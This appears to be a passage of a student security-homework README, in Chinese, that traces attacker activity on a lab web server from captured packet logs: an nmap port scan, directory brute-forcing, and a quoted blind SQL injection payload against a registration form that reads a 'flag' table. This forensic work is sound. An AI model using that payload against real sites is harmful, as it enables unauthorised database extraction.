# InformationSecurity_Homework

Jiaxing Qiu branch

## 代码

```
src/
 - datafilter.py: czy的数据预处理脚本
 - parseflag.py: 从批量HTML数据中解析出第四题flag的自动化脚本
```

## 攻击溯源记录（每个步骤后均附了一条log）

## 11

### 攻击步骤 4-1

（准备动作）在`Apr 17, 2023 00:40:30.975818000 CST`，服务器返回了一些返回给该攻击者的 HTTP Response，但日志中没有记录攻击者的对应请求。从内容看起来，攻击者使用了 nmap 端口扫描工具：`Nmap 6.49BETA1 scan initiated Sun Apr 16 16:40:15 2023 as: ./nmap -p 1-65535 -oN output1.txt 10.0.0.4`。

```
{"_index": "packets-2023-04-17", "_type": "doc", "_score": null, "_source": {"layers": {"frame": {"frame.encap_type": "1", "frame.time": "Apr 17, 2023 00:40:30.975818000 CST", "frame.offset_shift": "0.000000000", "frame.time_epoch": "1681663230.975818000", "frame.time_delta": "0.001427000", "frame.time_delta_displayed": "0.001427000", "frame.time_relative": "138892.849933000", "frame.number": "1611420", "frame.len": "1281", "frame.cap_len": "1281", "frame.marked": "0", "frame.ignored": "0", "frame.protocols": "eth:ethertype:ip:tcp:http:data-text-lines"}, "eth": {"eth.dst": "e2:33:ee:ef:45:42", "eth.dst_tree": {"eth.dst_resolved": "e2:33:ee:ef:45:42", "eth.dst.oui": "14824430", "eth.addr": "e2:33:ee:ef:45:42", "eth.addr_resolved": "e2:33:ee:ef:45:42", "eth.addr.oui": "14824430", "eth.dst.lg": "1", "eth.lg": "1", "eth.dst.ig": "0", "eth.ig": "0"}, "eth.src": "b6:84:a2:19:ef:2a", "eth.src_tree": {"eth.src_resolved": "b6:84:a2:19:ef:2a", "eth.src.oui": "11961506", "eth.addr": "b6:84:a2:19:ef:2a", "eth.addr_resolved": "b6:84:a2:19:ef:2a", "eth.addr.oui": "11961506", "eth.src.lg": "1", "eth.lg": "1", "eth.src.ig": "0", "eth.ig": "0"}, "eth.type": "0x0800"}, "ip": {"ip.version": "4", "ip.hdr_len": "20", "ip.dsfield": "0x00", "ip.dsfield_tree": {"ip.dsfield.dscp": "0", "ip.dsfield.ecn": "0"}, "ip.len": "1267", "ip.id": "0xe307", "ip.flags": "0x40", "ip.flags_tree": {"ip.flags.rb": "0", "ip.flags.df": "1", "ip.flags.mf": "0"}, "ip.frag_offset": "0", "ip.ttl": "64", "ip.proto": "6", "ip.checksum": "0x45e8", "ip.checksum.status": "2", "ip.src": "10.255.247.2", "ip.addr": "99.999.9.11", "ip.src_host": "10.255.247.2", "ip.host": "99.999.9.11", "ip.dst": "99.999.9.11", "ip.dst_host": "99.999.9.11"}, "tcp": {"tcp.srcport": "80", "tcp.dstport": "9605", "tcp.port": "9605", "tcp.stream": "41969", "tcp.completeness": "4", "tcp.len": "1227", "tcp.seq": "1", "tcp.seq_raw": "1221579176", "tcp.nxtseq": "1228", "tcp.ack": "1835", "tcp.ack_raw": "345664536", "tcp.hdr_len": "20", "tcp.flags": "0x0018", "tcp.flags_tree": {"tcp.flags.res": "0", "tcp.flags.ns": "0", "tcp.flags.cwr": "0", "tcp.flags.ecn": "0", "tcp.flags.urg": "0", "tcp.flags.ack": "1", "tcp.flags.push": "1", "tcp.flags.reset": "0", "tcp.flags.syn": "0", "tcp.flags.fin": "0", "tcp.flags.str": "·······AP···"}, "tcp.window_size_value": "501", "tcp.window_size": "64128", "tcp.window_size_scalefactor": "128", "tcp.checksum": "0x11fb", "tcp.checksum.status": "2", "tcp.urgent_pointer": "0", "Timestamps": {"tcp.time_relative": "0.136371000", "tcp.time_delta": "0.001427000"}, "tcp.analysis": {"tcp.analysis.bytes_in_flight": "1228", "tcp.analysis.push_bytes_sent": "1227"}, "tcp.payload": "48:54:54:50:2f:31:2e:31:20:32:30:30:20:4f:4b:0d:0a:53:65:72:76:65:72:3a:20:6e:67:69:6e:78:2f:31:2e:31:36:2e:31:0d:0a:44:61:74:65:3a:20:53:75:6e:2c:20:31:36:20:41:70:72:20:32:30:32:33:20:31:36:3a:34:30:3a:33:30:20:47:4d:54:0d:0a:43:6f:6e:74:65:6e:74:2d:54:79:70:65:3a:20:74:65:78:74:2f:68:74:6d:6c:3b:20:63:68:61:72:73:65:74:3d:55:54:46:2d:38:0d:0a:54:72:61:6e:73:66:65:72:2d:45:6e:63:6f:64:69:6e:67:3a:20:63:68:75:6e:6b:65:64:0d:0a:43:6f:6e:6e:65:63:74:69:6f:6e:3a:20:63:6c:6f:73:65:0d:0a:58:2d:50:6f:77:65:72:65:64:2d:42:79:3a:20:50:48:50:2f:37:2e:33:2e:31:30:0d:0a:0d:0a:34:30:30:0d:0a:ff:d8:ff:e0:00:10:4a:46:49:46:00:01:01:01:00:60:00:60:00:00:ff:db:00:43:00:08:06:06:07:06:05:08:07:07:07:09:09:08:0a:0c:14:0d:0c:0b:0b:0c:19:12:13:0f:14:1d:1a:1f:1e:1d:1a:1c:1c:20:24:2e:27:20:22:2c:23:1c:1c:28:37:29:2c:30:31:34:34:34:1f:27:39:3d:38:32:3c:2e:33:34:32:ff:db:00:43:01:09:09:09:0c:0b:0c:18:0d:0d:18:32:21:1c:21:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:ff:c0:00:11:08:00:6c:00:5c:03:01:22:00:02:11:01:03:11:01:ff:c4:00:1f:00:00:01:05:01:01:01:01:01:01:00:00:00:00:00:00:00:00:01:02:03:04:05:06:07:08:09:0a:0b:ff:c4:00:b5:10:00:02:01:03:03:02:04:03:05:05:04:04:00:00:01:7d:01:02:03:00:04:11:05:12:21:31:41:06:13:51:61:07:22:71:14:32:81:91:a1:08:23:42:b1:c1:15:52:d1:f0:24:33:62:72:82:09:0a:16:17:18:19:1a:25:26:27:28:29:2a:34:35:36:37:38:39:3a:43:44:45:46:47:48:49:4a:53:54:55:56:57:58:59:5a:63:64:65:66:67:68:69:6a:73:74:75:76:77:78:79:7a:83:84:85:86:87:88:89:8a:92:93:94:95:96:97:98:99:9a:a2:a3:a4:a5:a6:a7:a8:a9:aa:b2:b3:b4:b5:b6:b7:b8:b9:ba:c2:c3:c4:c5:c6:c7:c8:c9:ca:d2:d3:d4:d5:d6:d7:d8:d9:da:e1:e2:e3:e4:e5:e6:e7:e8:e9:ea:f1:f2:f3:f4:f5:f6:f7:f8:f9:fa:ff:c4:00:1f:01:00:03:01:01:01:01:01:01:01:01:01:00:00:00:00:00:00:01:02:03:04:05:06:07:08:09:0a:0b:ff:c4:00:b5:11:00:02:01:02:04:04:03:04:07:05:04:04:00:01:02:77:00:01:02:03:11:04:05:21:31:06:12:41:51:07:61:71:13:22:32:81:08:14:42:91:a1:b1:c1:09:23:33:52:f0:15:62:72:d1:0a:16:24:34:e1:25:f1:17:18:19:1a:26:27:28:29:2a:35:36:37:38:39:3a:43:44:45:46:47:48:49:4a:53:54:55:56:57:58:59:5a:63:64:65:66:67:68:69:6a:73:74:75:76:77:78:79:7a:82:83:84:85:86:87:88:89:8a:92:93:94:95:96:97:98:99:9a:a2:a3:a4:a5:a6:a7:a8:a9:aa:b2:b3:b4:b5:b6:b7:b8:b9:ba:c2:c3:c4:c5:c6:c7:c8:c9:ca:d2:d3:d4:d5:d6:d7:d8:d9:da:e2:e3:e4:e5:e6:e7:e8:e9:ea:f2:f3:f4:f5:f6:f7:f8:f9:fa:ff:da:00:0c:03:01:00:02:11:03:11:00:3f:00:f7:8a:29:70:7d:0f:e5:46:0f:a1:fc:a8:01:28:a5:c1:f4:3f:95:18:3e:87:f2:a0:04:a2:97:07:d0:fe:54:60:fa:1f:ca:80:12:8a:5c:1f:43:f9:51:83:e8:7f:2a:00:4a:29:70:7d:0f:e5:46:0f:a1:fc:a8:01:28:a5:c1:f4:3f:95:18:3e:87:f2:a0:09:a8:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:ff:d9:63:39:62:64:63:37:32:35:65:55:6e:61:62:6c:65:20:74:6f:20:66:69:6e:64:20:6e:6d:61:70:2d:73:65:72:76:69:63:65:73:21:20:20:52:65:73:6f:72:74:69:6e:67:20:74:6f:20:2f:65:74:63:2f:73:65:72:76:69:63:65:73:0a:23:20:4e:6d:61:70:20:36:2e:34:39:42:45:54:41:31:20:73:63:61:6e:20:69:6e:69:74:69:61:74:65:64:20:53:75:6e:20:41:70:72:20:31:36:20:31:36:3a:34:30:3a:31:35:20:32:30:32:33:20:61:73:3a:20:2e:2f:6e:6d:61:70:20:2d:70:20:31:2d:36:35:35:33:35:20:2d:6f:4e:20:6f:75:74:70:75:74:31:2e:74:78:74:20:31:30:2e:30:2e:30:2e:34:0a:39:61:38:63:62:34:39:61:39:61:63:65:0d:0a:30:0d:0a:0d:0a"}, "http": {"HTTP/1.1 200 OK\\r\\n": {"_ws.expert": {"http.chat": "", "_ws.expert.message": "HTTP/1.1 200 OK\\r\\n", "_ws.expert.severity": "2097152", "_ws.expert.group": "33554432"}, "http.response.version": "HTTP/1.1", "http.response.code": "200", "http.response.code.desc": "OK", "http.response.phrase": "OK"}, "http.server": "nginx/1.16.1", "http.response.line": "X-Powered-By: PHP/7.3.10\r\n", "http.date": "Sun, 16 Apr 2023 16:40:30 GMT", "http.content_type": "text/html; charset=UTF-8", "http.transfer_encoding": "chunked", "http.connection": "close", "\\r\\n": "", "http.response": "1", "http.response_number": "1", "HTTP chunked response": {"Data chunk (1024 octets)": {"http.chunk_size": "1024", "http.chunk_data": "ff:d8:ff:e0:00:10:4a:46:49:46:00:01:01:01:00:60:00:60:00:00:ff:db:00:43:00:08:06:06:07:06:05:08:07:07:07:09:09:08:0a:0c:14:0d:0c:0b:0b:0c:19:12:13:0f:14:1d:1a:1f:1e:1d:1a:1c:1c:20:24:2e:27:20:22:2c:23:1c:1c:28:37:29:2c:30:31:34:34:34:1f:27:39:3d:38:32:3c:2e:33:34:32:ff:db:00:43:01:09:09:09:0c:0b:0c:18:0d:0d:18:32:21:1c:21:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:32:ff:c0:00:11:08:00:6c:00:5c:03:01:22:00:02:11:01:03:11:01:ff:c4:00:1f:00:00:01:05:01:01:01:01:01:01:00:00:00:00:00:00:00:00:01:02:03:04:05:06:07:08:09:0a:0b:ff:c4:00:b5:10:00:02:01:03:03:02:04:03:05:05:04:04:00:00:01:7d:01:02:03:00:04:11:05:12:21:31:41:06:13:51:61:07:22:71:14:32:81:91:a1:08:23:42:b1:c1:15:52:d1:f0:24:33:62:72:82:09:0a:16:17:18:19:1a:25:26:27:28:29:2a:34:35:36:37:38:39:3a:43:44:45:46:47:48:49:4a:53:54:55:56:57:58:59:5a:63:64:65:66:67:68:69:6a:73:74:75:76:77:78:79:7a:83:84:85:86:87:88:89:8a:92:93:94:95:96:97:98:99:9a:a2:a3:a4:a5:a6:a7:a8:a9:aa:b2:b3:b4:b5:b6:b7:b8:b9:ba:c2:c3:c4:c5:c6:c7:c8:c9:ca:d2:d3:d4:d5:d6:d7:d8:d9:da:e1:e2:e3:e4:e5:e6:e7:e8:e9:ea:f1:f2:f3:f4:f5:f6:f7:f8:f9:fa:ff:c4:00:1f:01:00:03:01:01:01:01:01:01:01:01:01:00:00:00:00:00:00:01:02:03:04:05:06:07:08:09:0a:0b:ff:c4:00:b5:11:00:02:01:02:04:04:03:04:07:05:04:04:00:01:02:77:00:01:02:03:11:04:05:21:31:06:12:41:51:07:61:71:13:22:32:81:08:14:42:91:a1:b1:c1:09:23:33:52:f0:15:62:72:d1:0a:16:24:34:e1:25:f1:17:18:19:1a:26:27:28:29:2a:35:36:37:38:39:3a:43:44:45:46:47:48:49:4a:53:54:55:56:57:58:59:5a:63:64:65:66:67:68:69:6a:73:74:75:76:77:78:79:7a:82:83:84:85:86:87:88:89:8a:92:93:94:95:96:97:98:99:9a:a2:a3:a4:a5:a6:a7:a8:a9:aa:b2:b3:b4:b5:b6:b7:b8:b9:ba:c2:c3:c4:c5:c6:c7:c8:c9:ca:d2:d3:d4:d5:d6:d7:d8:d9:da:e2:e3:e4:e5:e6:e7:e8:e9:ea:f2:f3:f4:f5:f6:f7:f8:f9:fa:ff:da:00:0c:03:01:00:02:11:03:11:00:3f:00:f7:8a:29:70:7d:0f:e5:46:0f:a1:fc:a8:01:28:a5:c1:f4:3f:95:18:3e:87:f2:a0:04:a2:97:07:d0:fe:54:60:fa:1f:ca:80:12:8a:5c:1f:43:f9:51:83:e8:7f:2a:00:4a:29:70:7d:0f:e5:46:0f:a1:fc:a8:01:28:a5:c1:f4:3f:95:18:3e:87:f2:a0:09:a8:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:28:a2:8a:00:ff:d9:63:39:62:64:63:37:32:35:65:55:6e:61:62:6c:65:20:74:6f:20:66:69:6e:64:20:6e:6d:61:70:2d:73:65:72:76:69:63:65:73:21:20:20:52:65:73:6f:72:74:69:6e:67:20:74:6f:20:2f:65:74:63:2f:73:65:72:76:69:63:65:73:0a:23:20:4e:6d:61:70:20:36:2e:34:39:42:45:54:41:31:20:73:63:61:6e:20:69:6e:69:74:69:61:74:65:64:20:53:75:6e:20:41:70:72:20:31:36:20:31:36:3a:34:30:3a:31:35:20:32:30:32:33:20:61:73:3a:20:2e:2f:6e:6d:61:70:20:2d:70:20:31:2d:36:35:35:33:35:20:2d:6f:4e:20:6f:75:74:70:75:74:31:2e:74:78:74:20:31:30:2e:30:2e:30:2e:34:0a:39:61:38:63:62:34:39:61:39:61:63:65", "http.chunk_boundary": "0d:0a"}, "End of chunked encoding": {"http.chunk_size": "0"}, "\\r\\n": ""}, "http.file_data": "����"}, "data-text-lines": {"����\\000\\020JFIF\\000\\001\\001\\001\\000`\\000`\\000\\000��\\000C\\000\\b\\006\\006\\a\\006\\005\\b\\a\\a\\a\\t\\t\\b\\n": "", "\\f\\024\\r": "", "\\f\\v\\v\\f\\031\\022\\023\\017\\024\\035\\032\\037\\036\\035\\032\\034\\034 $.' \",#\\034\\034(7),01444\\037'9=82<.342��\\000C\\001\\t\\t\\t\\f\\v\\f\\030\\r": "", "\\r": "", " [truncated]\\0302!\\034!22222222222222222222222222222222222222222222222222��\\000\\021\\b\\000l\\000\\\\003\\001\"\\000\\002\\021\\001\\003\\021\\001��\\000\\037\\000\\000\\001\\005\\001\\001\\001\\001\\001\\001\\000\\000\\000\\000\\000\\000\\000\\000\\001\\002\\003\\004": "", "\\v��\\000�\\020\\000\\002\\001\\003\\003\\002\\004\\003\\005\\005\\004\\004\\000\\000\\001}\\001\\002\\003\\000\\004\\021\\005\\022!1A\\006\\023Qa\\a\"q\\0242���\\b#B��\\025R��$3br�\\t\\n": "", " [truncated]\\026\\027\\030\\031\\032%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz�����������������������������������������������������": "", "\\v��\\000�\\021\\000\\002\\001\\002\\004\\004\\003\\004\\a\\005\\004\\004\\000\\001\\002w\\000\\001\\002\\003\\021\\004\\005!1\\006\\022AQ\\aaq\\023\"2�\\b\\024B����\\t#3R�\\025br�\\n": "", " [truncated]\\026$4�%�\\027\\030\\031\\032&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz���������������������������������������������������": "", "# Nmap 6.49BETA1 scan initiated Sun Apr 16 16:40:15 2023 as: ./nmap -p 1-65535 -oN output1.txt 10.0.0.4\\n": "", "9a8cb49a9ace": ""}}}}
```

### 攻击步骤 4-2

（准备动作）攻击者在 `Apr 20, 2023 16:48:18.135916000 CST` - `Apr 20, 2023 18:04:07.408697000 CST` 时间段内，产生了 5714 条 GET 请求，并且绝大部分 GET 请求的URL在服务器上均不存在 (如 GET /admin.rar、GET /data.rar 等)，推断可能是进行了 dirsearch 目录扫描，为了查找隐藏目录、文件和子域名。

```
{"_index": "packets-2023-04-20", "_type": "doc", "_score": null, "_source": {"layers": {"frame": {"frame.encap_type": "1", "frame.time": "Apr 20, 2023 17:28:41.812695000 CST", "frame.offset_shift": "0.000000000", "frame.time_epoch": "1681982921.812695000", "frame.time_delta": "0.002171000", "frame.time_delta_displayed": "0.002171000", "frame.time_relative": "458583.686810000", "frame.number": "10122327", "frame.len": "562", "frame.cap_len": "562", "frame.marked": "0", "frame.ignored": "0", "frame.protocols": "eth:ethertype:ip:tcp:http:data-text-lines"}, "eth": {"eth.dst": "e2:33:ee:ef:45:42", "eth.dst_tree": {"eth.dst_resolved": "e2:33:ee:ef:45:42", "eth.dst.oui": "14824430", "eth.addr": "e2:33:ee:ef:45:42", "eth.addr_resolved": "e2:33:ee:ef:45:42", "eth.addr.oui": "14824430", "eth.dst.lg": "1", "eth.lg": "1", "eth.dst.ig": "0", "eth.ig": "0"}, "eth.src": "36:20:e4:65:ad:b8", "eth.src_tree": {"eth.src_resolved": "36:20:e4:65:ad:b8", "eth.src.oui": "3547364", "eth.addr": "36:20:e4:65:ad:b8", "eth.addr_resolved": "36:20:e4:65:ad:b8", "eth.addr.oui": "3547364", "eth.src.lg": "1", "eth.lg": "1", "eth.src.ig": "0", "eth.ig": "0"}, "eth.type": "0x0800"}, "ip": {"ip.version": "4", "ip.hdr_len": "20", "ip.dsfield": "0x00", "ip.dsfield_tree": {"ip.dsfield.dscp": "0", "ip.dsfield.ecn": "0"}, "ip.len": "548", "ip.id": "0x2f61", "ip.flags": "0x40", "ip.flags_tree": {"ip.flags.rb": "0", "ip.flags.df": "1", "ip.flags.mf": "0"}, "ip.frag_offset": "0", "ip.ttl": "64", "ip.proto": "6", "ip.checksum": "0xe22c", "ip.checksum.status": "2", "ip.src": "10.255.17.52", "ip.addr": "99.999.9.11", "ip.src_host": "10.255.17.52", "ip.host": "99.999.9.11", "ip.dst": "99.999.9.11", "ip.dst_host": "99.999.9.11"}, "tcp": {"tcp.srcport": "58359", "tcp.dstport": "7777", "tcp.port": "7777", "tcp.stream": "304316", "tcp.completeness": "15", "tcp.len": "496", "tcp.seq": "19", "tcp.seq_raw": "3188524457", "tcp.nxtseq": "515", "tcp.ack": "265", "tcp.ack_raw": "1565399560", "tcp.hdr_len": "32", "tcp.flags": "0x0018", "tcp.flags_tree": {"tcp.flags.res": "0", "tcp.flags.ns": "0", "tcp.flags.cwr": "0", "tcp.flags.ecn": "0", "tcp.flags.urg": "0", "tcp.flags.ack": "1", "tcp.flags.push": "1", "tcp.flags.reset": "0", "tcp.flags.syn": "0", "tcp.flags.fin": "0", "tcp.flags.str": "·······AP···"}, "tcp.window_size_value": "501", "tcp.window_size": "64128", "tcp.window_size_scalefactor": "128", "tcp.checksum": "0x295d", "tcp.checksum.status": "2", "tcp.urgent_pointer": "0", "tcp.options": "01:01:08:0a:79:1f:fb:9f:0f:c9:55:69", "tcp.options_tree": {"tcp.options.nop": "01", "tcp.options.nop_tree": {"tcp.option_kind": "1"}, "tcp.options.timestamp": "08:0a:79:1f:fb:9f:0f:c9:55:69", "tcp.options.timestamp_tree": {"tcp.option_kind": "8", "tcp.option_len": "10", "tcp.options.timestamp.tsval": "2032139167", "tcp.options.timestamp.tsecr": "264852841"}}, "Timestamps": {"tcp.time_relative": "0.393197000", "tcp.time_delta": "0.002171000"}, "tcp.analysis": {"tcp.analysis.initial_rtt": "0.067776000", "tcp.analysis.bytes_in_flight": "496", "tcp.analysis.push_bytes_sent": "496"}, "tcp.payload": "48:54:54:50:2f:31:2e:31:20:34:30:34:20:4e:6f:74:20:46:6f:75:6e:64:0d:0a:44:61:74:65:3a:20:54:68:75:2c:20:32:30:20:41:70:72:20:32:30:32:33:20:30:39:3a:32:38:3a:34:31:20:47:4d:54:0d:0a:53:65:72:76:65:72:3a:20:41:70:61:63:68:65:2f:32:2e:34:2e:37:20:28:55:62:75:6e:74:75:29:0d:0a:43:6f:6e:74:65:6e:74:2d:4c:65:6e:67:74:68:3a:20:32:38:30:0d:0a:4b:65:65:70:2d:41:6c:69:76:65:3a:20:74:69:6d:65:6f:75:74:3d:35:2c:20:6d:61:78:3d:31:30:30:0d:0a:43:6f:6e:6e:65:63:74:69:6f:6e:3a:20:4b:65:65:70:2d:41:6c:69:76:65:0d:0a:43:6f:6e:74:65:6e:74:2d:54:79:70:65:3a:20:74:65:78:74:2f:68:74:6d:6c:3b:20:63:68:61:72:73:65:74:3d:69:73:6f:2d:38:38:35:39:2d:31:0d:0a:0d:0a:3c:21:44:4f:43:54:59:50:45:20:48:54:4d:4c:20:50:55:42:4c:49:43:20:22:2d:2f:2f:49:45:54:46:2f:2f:44:54:44:20:48:54:4d:4c:20:32:2e:30:2f:2f:45:4e:22:3e:0a:3c:68:74:6d:6c:3e:3c:68:65:61:64:3e:0a:3c:74:69:74:6c:65:3e:34:30:34:20:4e:6f:74:20:46:6f:75:6e:64:3c:2f:74:69:74:6c:65:3e:0a:3c:2f:68:65:61:64:3e:3c:62:6f:64:79:3e:0a:3c:68:31:3e:4e:6f:74:20:46:6f:75:6e:64:3c:2f:68:31:3e:0a:3c:70:3e:54:68:65:20:72:65:71:75:65:73:74:65:64:20:55:52:4c:20:2f:61:64:6d:69:6e:2e:72:61:72:20:77:61:73:20:6e:6f:74:20:66:6f:75:6e:64:20:6f:6e:20:74:68:69:73:20:73:65:72:76:65:72:2e:3c:2f:70:3e:0a:3c:68:72:3e:0a:3c:61:64:64:72:65:73:73:3e:41:70:61:63:68:65:2f:32:2e:34:2e:37:20:28:55:62:75:6e:74:75:29:20:53:65:72:76:65:72:20:61:74:20:31:30:2e:30:2e:30:2e:34:20:50:6f:72:74:20:38:30:3c:2f:61:64:64:72:65:73:73:3e:0a:3c:2f:62:6f:64:79:3e:3c:2f:68:74:6d:6c:3e:0a"}, "http": {"HTTP/1.1 404 Not Found\\r\\n": {"_ws.expert": {"http.chat": "", "_ws.expert.message": "HTTP/1.1 404 Not Found\\r\\n", "_ws.expert.severity": "2097152", "_ws.expert.group": "33554432"}, "http.response.version": "HTTP/1.1", "http.response.code": "404", "http.response.code.desc": "Not Found", "http.response.phrase": "Not Found"}, "http.date": "Thu, 20 Apr 2023 09:28:41 GMT", "http.response.line": "Content-Type: text/html; charset=iso-8859-1\r\n", "http.server": "Apache/2.4.7 (Ubuntu)", "http.content_length_header": "280", "http.content_length_header_tree": {"http.content_length": "280"}, "http.connection": "Keep-Alive", "http.content_type": "text/html; charset=iso-8859-1", "\\r\\n": "", "http.response": "1", "http.response_number": "1", "http.time": "0.002226000", "http.request_in": "10122325", "http.response_for.uri": "http://10.0.0.4/admin.rar", "http.file_data": "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<html><head>\n<title>404 Not Found</title>\n</head><body>\n<h1>Not Found</h1>\n<p>The requested URL /admin.rar was not found on this server.</p>\n<hr>\n<address>Apache/2.4.7 (Ubuntu) Server at 10.0.0.4 Port 80</address>\n</body></html>\n"}, "data-text-lines": {"<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\\n": "", "<html><head>\\n": "", "<title>404 Not Found</title>\\n": "", "</head><body>\\n": "", "<h1>Not Found</h1>\\n": "", "<p>The requested URL /admin.rar was not found on this server.</p>\\n": "", "<hr>\\n": "", "<address>Apache/2.4.7 (Ubuntu) Server at 10.0.0.4 Port 80</address>\\n": "", "</body></html>\\n": ""}}}}
```

```
{"frame.time": "Apr 20, 2023 17:18:44.100998000 CST", "tcp": {"tcp.srcport": "7000", "tcp.dstport": "55110", "tcp.port": "55110", "tcp.stream": "303600", "tcp.completeness": "15", "tcp.len": "112", "tcp.seq": "952", "tcp.seq_raw": "1924136764", "tcp.nxtseq": "1064", "tcp.ack": "738", "tcp.ack_raw": "3366277366", "tcp.hdr_len": "32", "tcp.flags": "0x0018", "tcp.flags_tree": {"tcp.flags.res": "0", "tcp.flags.ns": "0", "tcp.flags.cwr": "0", "tcp.flags.ecn": "0", "tcp.flags.urg": "0", "tcp.flags.ack": "1", "tcp.flags.push": "1", "tcp.flags.reset": "0", "tcp.flags.syn": "0", "tcp.flags.fin": "0", "tcp.flags.str": "\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7AP\u00b7\u00b7\u00b7"}, "tcp.window_size_value": "49150", "tcp.window_size": "12582400", "tcp.window_size_scalefactor": "256", "tcp.checksum": "0x2ada", "tcp.checksum.status": "2", "tcp.urgent_pointer": "0", "tcp.options": "01:01:08:0a:0f:c0:36:9b:79:16:d1:b1", "tcp.options_tree": {"tcp.options.nop": "01", "tcp.options.nop_tree": {"tcp.option_kind": "1"}, "tcp.options.timestamp": "08:0a:0f:c0:36:9b:79:16:d1:b1", "tcp.options.timestamp_tree": {"tcp.option_kind": "8", "tcp.option_len": "10", "tcp.options.timestamp.tsval": "264255131", "tcp.options.timestamp.tsecr": "2031538609"}}, "Timestamps": {"tcp.time_relative": "304.419462000", "tcp.time_delta": "0.000086000"}, "tcp.analysis": {"tcp.analysis.initial_rtt": "0.194333000", "tcp.analysis.bytes_in_flight": "364", "tcp.analysis.push_bytes_sent": "112"}, "tcp.payload": "65:6d:61:69:6c:3d:31:25:34:30:31:2e:63:6f:6d:26:75:73:65:72:6e:61:6d:65:3d:30:25:32:37:25:32:42:61:73:63:69:69:25:32:38:73:75:62:73:74:72:25:32:38:25:32:38:73:65:6c:65:63:74:2b:25:32:41:2b:66:72:6f:6d:2b:66:6c:61:67:25:32:39:2b:66:72:6f:6d:2b:31:2b:66:6f:72:2b:31:25:32:39:25:32:39:25:32:42:25:32:37:30:26:70:61:73:73:77:6f:72:64:3d:31", "tcp.segment_data": "65:6d:61:69:6c:3d:31:25:34:30:31:2e:63:6f:6d:26:75:73:65:72:6e:61:6d:65:3d:30:25:32:37:25:32:42:61:73:63:69:69:25:32:38:73:75:62:73:74:72:25:32:38:25:32:38:73:65:6c:65:63:74:2b:25:32:41:2b:66:72:6f:6d:2b:66:6c:61:67:25:32:39:2b:66:72:6f:6d:2b:31:2b:66:6f:72:2b:31:25:32:39:25:32:39:25:32:42:25:32:37:30:26:70:61:73:73:77:6f:72:64:3d:31"}}

email=1%401.com&username=0%27%2Bascii%28substr%28%28select+%2A+from+flag%29+from+1+for+1%29%29%2B%270&password=1
```

## 12

### 攻击步骤 4-1

（准备动作）在`Apr 19, 2023 05:07:23.156560000 CST`，攻击者开始访问目标服务器。一开始攻击者只是访问了`login.php`，但紧接着，从`Apr 19, 2023 05:08:18.468699000 CST`持续到了`Apr 19, 2023 05:13:48.401346000 CST`，攻击者大量访问了web服务经常会泄露信息的路径，如`/.admin`、`/.access`、`/.AppleDB`、`/.git`等，扫描记录一共11686条，考虑是该同学利用`dirsearch`或类似工具对网站进行了目录扫描。

```
{"_index": "packets-2023-04-19", "_type": "doc", "_score": null, "_source": {"layers": {"frame": {"frame.encap_type": "1", "frame.time": "Apr 19, 2023 05:08:18.468699000 CST", "frame.offset_shift": "0.000000000", "frame.time_epoch": "1681852098.468699000", "frame.time_delta": "0.005759000", "frame.time_delta_displayed": "0.005759000", "frame.time_relative": "327760.342814000", "frame.number": "6879355", "frame.len": "397", "frame.cap_len": "397", "frame.marked": "0", "frame.ignored": "0", "frame.protocols": "eth:ethertype:ip:tcp:http"}, "eth": {"eth.dst": "62:d1:ea:ce:1d:30", "eth.dst_tree": {"eth.dst_resolved": "62:d1:ea:ce:1d:30", "eth.dst.oui": "6476266", "eth.addr": "62:d1:ea:ce:1d:30", "eth.addr_resolved": "62:d1:ea:ce:1d:30", "eth.addr.oui": "6476266", "eth.dst.lg": "1", "eth.lg": "1", "eth.dst.ig": "0", "eth.ig": "0"}, "eth.src": "e2:33:ee:ef:45:42", "eth.src_tree": {"eth.src_resolved": "e2:33:ee:ef:45:42", "eth.src.oui": "14824430", "eth.addr": "e2:33:ee:ef:45:42", "eth.addr_resolved": "e2:33:ee:ef:45:42", "eth.addr.oui": "14824430", "eth.src.lg": "1", "eth.lg": "1", "eth.src.ig": "0", "eth.ig": "0"}, "eth.type": "0x0800"}, "ip": {"ip.version": "4", "ip.hdr_len": "20", "ip.dsfield": "0x00", "ip.dsfield_tree": {"ip.dsfield.dscp": "0", "ip.dsfield.ecn": "0"}, "ip.len": "383", "ip.id": "0x53e4", "ip.flags": "0x40", "ip.flags_tree": {"ip.flags.rb": "0", "ip.flags.df": "1", "ip.flags.mf": "0"}, "ip.frag_offset": "0", "ip.ttl": "62", "ip.proto": "6", "ip.checksum": "0xf794", "ip.checksum.status": "2", "ip.src": "99.999.9.12", 